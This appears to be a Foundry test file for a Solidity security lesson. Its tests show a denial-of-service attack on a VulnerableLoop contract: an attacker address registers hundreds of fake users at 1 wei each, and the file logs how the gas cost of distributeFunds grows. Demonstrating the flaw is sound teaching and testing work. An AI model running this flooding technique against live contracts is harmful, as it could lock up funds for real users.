// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {VulnerableLoop} from "../../src/DOS/Loop_attack.sol";

contract VulnerableLoopTest is Test {
    VulnerableLoop public vulnerable;
    
    address user1 = makeAddr("user1");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vulnerable = new VulnerableLoop();
    }

    function test_DenialOfServiceAttack() public {
        vm.deal(user1, 1 ether);
        vm.prank(user1);
        vulnerable.addUser{value: 0.1 ether}(user1);

        vm.deal(attacker, 10 ether);
        vm.startPrank(attacker);
        
        for (uint160 i = 1; i <= 500; i++) {
            address fakeUser = address(i + 1000); 
            vulnerable.addUser{value: 1 wei}(fakeUser);
        }
        vm.stopPrank();

        console.log("Total users: %d", vulnerable.getUserCount());
        
        uint256 gasBefore = gasleft();
        vulnerable.distributeFunds();
        uint256 gasUsed = gasBefore - gasleft();
        
        console.log("Gas used: %d", gasUsed);
        assertTrue(gasUsed > 1_000_000, "Gas usage indicates vulnerability to DoS with larger user counts");
        
        console.log("DoS attack demonstration successful - high gas usage shown");
    }

    function test_GasGrowthDemonstration() public {
        address[] memory users = new address[](10);
        for (uint160 i = 0; i < 10; i++) {
            users[i] = address(uint160(i + 1000)); 
        }

        vm.deal(user1, 10 ether);
        vm.startPrank(user1);
        
        for (uint256 i = 0; i < 10; i++) {
            vulnerable.addUser{value: 0}(users[i]);
            
            uint256 gasBefore = gasleft();
            vulnerable.distributeFunds();
            uint256 gasUsed = gasBefore - gasleft();
            
            console.log("With %d users - Gas: %d", i + 1, gasUsed);
        }
        vm.stopPrank();
    }

    function test_MinimalGasDemonstration() public {
        vm.deal(user1, 1 ether);
        vm.prank(user1);
        vulnerable.addUser{value: 0.1 ether}(user1);

        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);
        for (uint160 i = 1; i <= 10; i++) {
            address fakeUser = address(i + 1000); 
            vulnerable.addUser{value: 1 wei}(fakeUser);
        }
        vm.stopPrank();

        uint256 gasBefore = gasleft();
        vulnerable.distributeFunds();
        uint256 gasUsed = gasBefore - gasleft();

        console.log("Gas used with 11 users: %d", gasUsed);
        assertTrue(gasUsed > 20000, "High gas usage demonstrates vulnerability");
    }
}